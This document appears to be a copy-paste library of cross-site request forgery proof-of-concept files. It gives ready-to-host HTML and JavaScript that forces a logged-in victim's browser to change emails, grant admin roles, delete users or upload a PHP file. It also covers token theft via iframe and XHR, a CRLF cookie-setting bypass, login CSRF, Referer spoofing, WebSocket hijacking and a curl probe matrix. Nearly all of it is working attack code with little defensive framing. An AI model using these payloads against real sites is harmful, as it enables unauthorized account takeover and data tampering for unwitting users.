# Copy-paste CSRF PoC library (auto-submit forms, JSON/multipart/method-override) — Open WHEN: you have a confirmed state-changing endpoint with no/replayable token and need a ready-to-host HTML/JS PoC for the exact method+content-type

All PoCs below are full files to host on a separate origin and load in the
victim's authenticated browser. `history.pushState('','','/')` hides the
real form action in the address bar. Swap `https://victim.example/...`,
field names, and values for the live endpoint.

## Top-level GET — zero interaction (`<img>`/HTML tag)

Fires on page load with the victim's cookies. Use for GET endpoints that
mutate state (account-delete links, `?newEmail=`, toggle flags).

```html
<img src="https://victim.example/account/settings?newEmail=test@evil.test" style="display:none" />
```

Other tags that auto-issue a credentialed GET (use when `<img>` is filtered
or the response isn't an image): `<script src>`, `<iframe src>`, `<embed src>`,
`<audio src>`, `<video src>`, `<link rel=stylesheet href>`, `<object data>`,
`<body background>`, `<input type=image src>`, `<bgsound src>`,
`<track src>`, and CSS `background: url(...)`.

```html
<iframe src="https://victim.example/api/setflag?on=1" style="display:none"></iframe>
<input type="image" src="https://victim.example/api/setflag?on=1" alt="">
<style>body{background:url('https://victim.example/api/setflag?on=1')}</style>
```

## Auto-submit GET form (params with special chars)

Use when GET params need `&`/`=`/encoding that a raw URL tag mangles.

```html
<html><body>
<script>history.pushState('','','/')</script>
<form method="GET" action="https://victim.example/email/change-email">
  <input type="hidden" name="email" value="test@evil.test" />
</form>
<script>document.forms[0].submit()</script>
</body></html>
```

## Auto-submit POST form (form-urlencoded, no preflight)

The workhorse. Three independent auto-submit triggers shown — keep any one.

```html
<html><body>
<script>history.pushState('','','/')</script>
<form method="POST" action="https://victim.example/email/change-email" id="f">
  <input type="hidden" name="email" value="test@evil.test"
         autofocus onfocus="f.submit();" />   <!-- trigger 1: onfocus -->
  <img src="x" onerror="f.submit();" />        <!-- trigger 2: img onerror -->
</form>
<script>document.forms[0].submit()</script>     <!-- trigger 3: script -->
</body></html>
```

### POST via hidden iframe (no page navigation, blind multi-step)

Submits without reloading the host page — chain several into one page.

```html
<html><body>
<iframe style="display:none" name="t"></iframe>
<form method="POST" action="https://victim.example/change-email" target="t" id="f">
  <input type="hidden" name="email" value="test@evil.test" />
</form>
<script>document.forms[0].submit()</script>
</body></html>
```

## Empty / removed token

If validation only runs when the token *value* is non-empty, send `csrf=`.
If it only runs when the param *exists*, delete the input entirely.

```html
<form action="https://victim.example/admin/users/role" method="POST">
  <input type="hidden" name="username" value="guest" />
  <input type="hidden" name="role" value="admin" />
  <input type="hidden" name="csrf" value="" />   <!-- empty value accepted -->
</form>
<script>document.forms[0].submit()</script>
```

## Method override (POST carrying `_method`)

For PUT/PATCH/DELETE handlers where CSRF is only checked on the literal verb.
Try the body param first, then the override headers (header variant needs
fetch, below). Frameworks: Laravel, Symfony, Express, Rails.

```html
<form method="POST" action="https://victim.example/users/delete">
  <input type="hidden" name="username" value="admin" />
  <input type="hidden" name="_method" value="DELETE" />
</form>
<script>document.forms[0].submit()</script>
```

Query-string form of the same trick: `POST /api/val/num?_method=PUT`.
Header form (simple-request-safe headers only fail here — these force a
preflight, so use only if CORS already allows them):

```js
fetch("https://victim.example/users/delete", {
  method:"POST", credentials:"include",
  headers:{"X-HTTP-Method-Override":"DELETE"},        // also: X-HTTP-Method, X-Method-Override
  body:"username=admin"
});
```

## JSON endpoint via `text/plain` form (no preflight)

When the server parses a JSON body but ignores `Content-Type`. Split the JSON
across the input `name` and `value`; `enctype="text/plain"` writes
`name=value` verbatim so the wire body is valid JSON.

Sends `{"role":admin,"other":"="}`:

```html
<form action="https://victim.example/api/setrole" enctype="text/plain" method="POST" id="f">
  <input type="hidden" name='{"role":admin, "other":"' value='"}' />
</form>
<script>document.getElementById('f').submit()</script>
```

Multi-field variant — sends `{"garbageeeee":"", "yep":"yep", "url":"https://hook/"}`:

```html
<form method="post" action="https://victim.example/" enctype="text/plain" id="f">
  <input name='{"garbageeeee":"' value='", "yep": "yep", "url": "https://hook/"}' />
</form>
<script>form=document.getElementById('f');form.submit()</script>
```

### JSON via XHR with a simple Content-Type

`text/plain` is a CORS "simple" type → no preflight. Try the
form-urlencoded and multipart variants too; the body stays raw JSON.

```js
var xhr=new XMLHttpRequest();
xhr.open("POST","https://victim.example/api/setrole");
xhr.withCredentials=true;
xhr.setRequestHeader("Content-Type","text/plain");        // also try:
// xhr.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
// xhr.setRequestHeader("Content-Type","multipart/form-data");
xhr.send('{"role":"admin"}');
```

Compound type that some servers route to the JSON parser without preflight:

```
Content-Type: text/plain; application/json
```

If the endpoint genuinely demands real `application/json` and CORS is wide
open (`Allow-Origin` reflected + `Allow-Credentials: true`), a preflighted
XHR still lands:

```js
var xhr=new XMLHttpRequest();
xhr.open("POST","https://victim.example/api/setrole");
xhr.withCredentials=true;
xhr.setRequestHeader("Content-Type","application/json;charset=UTF-8");
xhr.send('{"role":"admin"}');
```

## multipart/form-data with file upload (no preflight)

Forge an upload (drop a file into storage, replace an avatar, etc.).

```html
<script>
function go(){
  const dT=new DataTransfer();
  dT.items.add(new File(["CSRF-filecontent"],"pwned.txt"));
  document.up[0].files=dT.files;
  document.up.submit();
}
</script>
<form style="display:none" name="up" method="post"
      action="https://victim.example/upload" enctype="multipart/form-data">
  <input id="file" type="file" name="file" />
</form>
<body onload="go()"></body>
```

fetch form — auto-builds the multipart boundary, sends credentialed:

```js
var fd=new FormData();
fd.append("newAttachment", new Blob(["<?php phpinfo(); ?>"],{type:"text/plain"}), "pwned.php");
fetch("https://victim.example/some/path",{method:"post",body:fd,credentials:"include",mode:"no-cors"});
```

## Token theft via same-origin iframe (token NOT bound to session)

Only works if the PoC origin can read the victim page (same-origin, or the
token is in a global pool reusable across users). Read the token from a
loaded page, then submit a form carrying it.

```html
<iframe id="if" src="https://victim.example/profile" onload="read()"></iframe>
<script>
function read(){
  var t=document.getElementById('if').contentDocument.forms[0].token.value;
  document.write('<form method="post" action="https://victim.example/check" enctype="multipart/form-data">'
    +'<input name="username" value="admin"><input name="token" value="'+t+'"></form>');
  document.forms[0].submit();
}
</script>
```

XHR variant — GET the form page, regex out the token, replay it in a POST:

```js
var x=new XMLHttpRequest();
x.withCredentials=true;
x.open("GET","https://victim.example/profile",true);
x.onreadystatechange=function(){
  if(x.readyState==4){
    var t=x.responseText.match(/name="token" value="(.+?)"/)[1];
    var p=new XMLHttpRequest();
    p.open("POST","https://victim.example/check",true); p.withCredentials=true;
    p.setRequestHeader("Content-type","application/x-www-form-urlencoded");
    p.send("token="+t+"&username=root&status=on");
  }
};
x.send(null);
```

## Set-the-CSRF-cookie via CRLF, then submit (double-submit cookie bypass)

When the token is validated against a cookie value the test origin can set
(e.g. via a CRLF/header-injection sink). Set the cookie, then submit the
matching form value. Note: fails if the token is tied to the *session* cookie.

```html
<form action="https://victim.example/my-account/change-email" method="POST">
  <input type="hidden" name="email" value="test@evil.test" />
  <input type="hidden" name="csrf" value="FAKE_TOKEN_VALUE" />
</form>
<img src="https://victim.example/?search=x%0d%0aSet-Cookie:%20csrf=FAKE_TOKEN_VALUE"
     onerror="document.forms[0].submit();" />
```

## Login CSRF (force victim into a test-controlled account)

Logs the victim into your account; later actions (or a stored XSS in that
account) run in your context. Chain: log victim out first to clear tokens,
then submit these credentials.

```html
<form action="https://victim.example/login" method="POST">
  <input type="hidden" name="username" value="ctl@evil.test" />
  <input type="hidden" name="password" value="StrongPass123!" />
</form>
<script>
history.pushState('','','/'); document.forms[0].submit();
// then optionally: location='https://victim.example/app/inbox';
</script>
```

## Referer suppression / spoofing

Strip the Referer entirely (passes "validate only when present" logic):

```html
<meta name="referrer" content="never">
```

Place the trusted host inside the Referer query so a substring/regex check
passes. Requires `content="unsafe-url"` to keep the query in the Referer:

```html
<head><meta name="referrer" content="unsafe-url" /></head>
<body>
<form action="https://victim.example/my-account/change-email" method="POST">
  <input type="hidden" name="email" value="test@evil.test" />
</form>
<script>
history.pushState('','','?victim.example');   // domain now appears in Referer query
document.forms[0].submit();
</script>
</body>
```

Lookalike-host tricks for `Referer`/`Origin` substring checks:
`http://mal.test?orig=http://victim.example` (ends with trusted),
`http://victim.example.mal.test` (starts with trusted).

## HEAD-as-GET bypass

Routers that map HEAD to the GET handler (e.g. Oak) reach a "GET-restricted"
path via HEAD. Probe with curl:

```bash
curl -I --cookie "session=$C" "https://victim.example/restricted/action?x=1"
```

## WebSocket / Socket.IO CSRF (no Origin check on handshake)

Cookies ride the handshake; if the server skips `Origin` validation a
cross-site page opens an authenticated socket and emits actions.

```html
<script src="https://cdn.jsdelivr.net/npm/socket.io-client@2/dist/socket.io.js"></script>
<script>
let s=io("https://victim.example/test");
s.on("connect",()=>{ s.emit("join",{room:"admin"});
  s.emit("my_room_event",{data:"!flag",room:"admin"}); });
</script>
```

## curl probe matrix (run before building the HTML)

Confirm which method/content-type the endpoint honors, and whether the token
is enforced, before hosting a PoC.

```bash
C='session=...'                       # captured authed cookie
U='https://victim.example/email/change-email'
# 1. form POST, no token at all
curl -i -b "$C" -H 'Content-Type: application/x-www-form-urlencoded' --data 'email=t@evil.test' "$U"
# 2. same action as GET (method-conditioned token check)
curl -i -b "$C" "$U?email=t@evil.test"
# 3. empty token value
curl -i -b "$C" --data 'email=t@evil.test&csrf=' "$U"
# 4. JSON parsed from text/plain (no preflight)
curl -i -b "$C" -H 'Content-Type: text/plain' --data '{"email":"t@evil.test"}' "$U"
# 5. method override via POST body
curl -i -b "$C" --data 'username=admin&_method=DELETE' 'https://victim.example/users/delete'
# 6. cross-origin Origin/Referer not enforced
curl -i -b "$C" -H 'Origin: https://evil.test' -H 'Referer: https://evil.test/' --data 'email=t@evil.test' "$U"
# 7. null Origin accepted (sandboxed-iframe class)
curl -i -b "$C" -H 'Origin: null' --data 'email=t@evil.test' "$U"
# 8. replay another user's token (token-not-tied-to-session)
curl -i -b "$C" --data "email=t@evil.test&csrf=$STOLEN_TOKEN" "$U"
```

Capture before/after account state for the same victim to prove impact.
```
